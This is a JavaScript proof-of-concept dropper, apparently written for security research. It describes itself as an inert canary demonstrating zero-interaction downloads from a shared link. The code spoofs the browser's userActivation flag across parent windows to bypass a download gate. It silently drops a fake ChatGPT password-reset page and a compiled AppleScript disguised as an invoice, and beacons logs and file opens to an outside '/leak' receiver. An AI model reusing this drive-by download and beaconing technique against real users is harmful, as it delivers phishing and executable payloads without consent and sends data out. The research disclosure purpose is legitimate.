/* T71-PART2 - SILENT DUAL-FILE DROPPER, ZERO UI (Pluto Security, inert canary).
   For the second demonstration video: the shared link is opened, NO app UI
   appears at all (the widget collapses to an invisible sliver), and TWO
   files land silently in ~/Downloads:
     load #1 -> "ChatGPT_Password_Reset_Required.pdf.html"  (reset-page look)
     ~3s later a single page reload re-arms the one-shot download
     load #2 -> "Invoice_2026.scpt"  (genuinely compiled AppleScript - the
                T72-proven path: opens in Script Editor with NO Gatekeeper
                prompt, executes after one Run press; inert Calculator demo)
   Both files are clearly-labeled inert canary pages that beacon to OUR OWN
   receiver when opened. Nothing real. The names are attacker-chosen
   curiosity bait - the demo point: files land with zero interaction. */
(function () {
  var SCPT_B64 = "RmFzZFVBUyAxLjEwMS4xMA4AAAAED///AAEAAgADAf//AAANAAEAAWsAAAAAAAAABAIABAACAAUABg0ABQADbAACAAAABQAH//7//Q0ABwADSQACAAAABf/8AAj/+wr//AAYLnN5c29leGVjVEVYVP//gAAAAAAAVEVYVA0ACAABbQAAAAAAAQAJDgAJAAGxAAoRAAoAJABvAHAAZQBuACAALQBhACAAQwBhAGwAYwB1AGwAYQB0AG8AcgL/+wAAAf/+AAAB//0AAAIABgACAAv/+g0ACwADbAACAAYAEQAM//n/+A0ADAADSQACAAYAEf/3AA0ADgr/9wAYLnN5c29kbG9nYXNrcgAAAAAAAAAAVEVYVA0ADQABbQAAAAYABwAPDgAPAAGxABARABAARgBUADcAMgAgAGMAYQBuAGEAcgB5ACAAKABpAG4AZQByAHQAKQAgAC0AIABQAGwAdQB0AG8AIABTAGUAYwB1AHIAaQB0AHkGAA4AA//2ABEAEgr/9gAECmJ0bnMNABEAAUoAAAAIAAsAEwIAEwACABT/9Q0AFAABbQAAAAgACQAVDgAVAAGxABYRABYABABPAEsC//UAAAYAEgAD//QAF//zCv/0AAQKZGZsdA0AFwABbQAAAAwADQAYDgAYAAGxABkRABkABABPAEsG//MAAAH/+QAAAf/4AAAC//oAAA4AAgAADxAAAwAD//IAGgAbAf/yAAAQABoAAf/xCv/xABguYWV2dG9hcHBudWxsAACAAAAAkAAqKioqDgAbAAcQ//AAHP/v/+4AHQAe/+0K//AAGC5hZXZ0b2FwcG51bGwAAIAAAACQACoqKioNABwAAWsAAAAAABEAHwIAHwACAAUAIAIAIAACAAv/7AL/7AAAAf/vAAAC/+4AABAAHQAAEAAeAAkACf/rAA//6gAV/+kAGP/o/+cK/+sAGC5zeXNvZXhlY1RFWFT//4AAAAAAAFRFWFQK/+oABApidG5zCv/pAAQKZGZsdAP/6AAECv/nABguc3lzb2Rsb2dhc2tyAAAAAAAAAABURVhUEf/tABLgagwAAU/i4+RrduXm5wwACA9hc2NyAAEADPre3q0=";
  var R = "https://consultant-casinos-generation-camel.trycloudflare.com/leak?d=";
  var EPOCH = 1792678200;
  /* invisible debug channel: every log line is also beaconed to the
     receiver dashboard (the UI is hidden in part 2, so the dashboard
     is the console) */
  var RLOG = "https://consultant-casinos-generation-camel.trycloudflare.com/leak?d=";
  function log(m) {
    try { console.log("[T71P2] " + m + " @" + Date.now()); } catch (e) {}
    try {
      var im = new Image();
      im.src = RLOG + encodeURIComponent("LOG|T71P2|" + String(m).slice(0, 120)) + "-" + Date.now();
    } catch (e2) {}
  }
  log("PART2 silent dual-drop, epoch " + EPOCH);

  /* spoof userActivation on every same-origin window (T11-proven; the
     host download interceptor's gate reads the runner realm) */
  function spoofChain() {
    var w = window, n = 0;
    for (var i = 0; i < 6; i++) {
      try {
        Object.defineProperty(w.navigator, "userActivation", {
          get: function () { return { isActive: true, hasBeenActive: true }; },
          configurable: true
        });
        n++;
      } catch (e) {}
      try { var p = w.parent; if (!p || p === w) break; w = p; } catch (e) { break; }
    }
    return n;
  }

  /* which file this page-load drops (sessionStorage alternation) */
  var step = 1;
  try { if (sessionStorage.getItem("t71p2") === "1") step = 2; } catch (e) {}
  log("load step " + step + " (spoof " + spoofChain() + " windows)");

  function esc(s) { return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }

  function buildFile() {
    var tok = "T71P2-" + EPOCH + "-s" + step;
    var name, inner;
    if (step === 1) {
      name = "ChatGPT_Password_Reset_Required.pdf.html";
      inner =
        "<h2 style=\"font-weight:600\">Password reset required</h2>" +
        "<p style=\"color:#666\">We detected a suspicious sign-in attempt on your account. A password reset is required within 24 hours.</p>" +
        "<p style=\"color:#c00;font-size:11px;font-family:Menlo,monospace\">PLUTO SECURITY RESEARCH CANARY - INERT</p>";
    } else {
      name = "Invoice_2026.scpt";
    }
    var beacon = encodeURIComponent(tok + "|file=" + name);
    var html = [
      "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>" + esc(name.replace(/\\.pdf\\.html$/, "")) + "</title></head>",
      "<body style=\"font:14px -apple-system,Helvetica,Arial,sans-serif;background:#fff;color:#111;padding:24px;max-width:520px\">",
      inner,
      "<pre id=\"out\" style=\"font:11px Menlo,monospace\"></pre>",
      "<script>",
      "var R = \"" + R + "\";",
      "function log(m){var o=document.getElementById('out');o.textContent+='\\\\n'+m;}",
      "log('opened as file:// at '+Date.now()+' (no warning shown)');",
      "try{fetch(R+'" + beacon + "-fetch').then(function(r){log('FETCH BEACON SENT status='+r.status);}).catch(function(e){log('fetch blocked '+e.message);});}catch(e){}",
      "var i=new Image();i.onload=function(){log('IMG BEACON SENT');};i.onerror=function(){};",
      "i.src=R+'" + beacon + "-img';",
      "<\/script></body></html>"
    ].join("");
    return { name: name, html: html };
  }

  function boot() {
    var d = document;
    /* part-2 v3: the playground UI STAYS visible (console panel = readable
       logs); this payload draws nothing itself */

    /* silent write via the host download bootstrap (T66-proven) */
    var f = buildFile();
    try {
      var blob;
      if (step === 2) {
        /* compiled AppleScript (T72-proven: quarantined .scpt opens in
           Script Editor with NO Gatekeeper prompt; inert Calculator demo) */
        var bin = atob(SCPT_B64);
        var bytes = new Uint8Array(bin.length);
        for (var k = 0; k < bin.length; k++) bytes[k] = bin.charCodeAt(k);
        blob = new Blob([bytes], { type: "application/x-applescript" });
      } else {
        blob = new Blob([f.html], { type: "text/html" });
      }
      var url = URL.createObjectURL(blob);
      var a = d.createElement("a");
      a.href = url;
      a.download = f.name;
      a.style.display = "none";
      d.body.appendChild(a);
      a.click();
      setTimeout(function () { URL.revokeObjectURL(url); a.remove(); }, 4000);
      log("WRITE FIRED: " + f.name);
    } catch (e) { log("write ERR " + e.message); }

    /* step 1: single quiet reload re-arms the one-shot interceptor for file 2 */
    if (step === 1) {
      try { sessionStorage.setItem("t71p2", "1"); } catch (e) {}
      setTimeout(function () {
        log("reloading once to drop file 2...");
        try { location.reload(); } catch (e) { log("reload ERR " + e.message); }
      }, 3000);
    } else {
      try { sessionStorage.removeItem("t71p2"); } catch (e) {}
      log("both files delivered - done");
    }
  }

  if (document.body) boot();
  else if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
  else { var iv = setInterval(function () { if (document.body) { clearInterval(iv); boot(); } }, 50); }
})();
